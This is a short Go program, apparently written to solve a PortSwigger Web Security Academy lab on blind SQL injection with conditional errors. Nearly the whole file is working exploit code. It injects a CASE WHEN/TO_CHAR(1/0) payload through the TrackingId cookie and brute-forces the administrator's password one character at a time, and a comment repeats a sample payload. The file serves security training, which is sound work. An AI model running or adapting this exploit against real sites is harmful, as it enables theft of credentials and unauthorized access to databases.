/*
	this expliot use to solve this ps lab:
	https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors

*/

package main

import (
	"fmt"
	"log"
	"net/http"
	"strconv"
)

var d []int

func extract(tURL string, t int) {

	for c := 47; c < 140; c++ {

		req, err := http.NewRequest("get", tURL, nil)
		payload := "select password from users where username='administrator'"
		cVal := http.Cookie{
			Name:  "TrackingId",
			Value: "x' and (SELECT CASE WHEN (ascii(substr((" + payload + ")," + strconv.Itoa(t) + ",1))=" + strconv.Itoa(c) + ") THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a'--",
		}

		req.AddCookie(&cVal)
		client := http.Client{}

		resp, err := client.Do(req)
		if err != nil {
			log.Panic(err)
		}

		if resp.StatusCode != 200 {
			d = append(d, c)
			fmt.Print(string(rune(c)))
		}
	}

	/*

	   gHvtvSp51bTgQzO7' and (SELECT CASE WHEN (ascii(substr((select password from users where username='administrator'),1,1))=123) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a'--

	*/

}

func main() {
	tURL := "https://0a8f001e03477a6c80c117f3002b00d0.web-security-academy.net/"
	fmt.Println("Start Extracting, be patient!...")
	// var wg sync.WaitGroup
	for t := 1; t < 23; t++ {
		// wg.Add(1)
		// go func(p int) {
		extract(tURL, t)
		// 	wg.Done()
		// }(t)
	}

	// wg.Wait()
	defer fmt.Println("\nLenght: ", len(d))
}
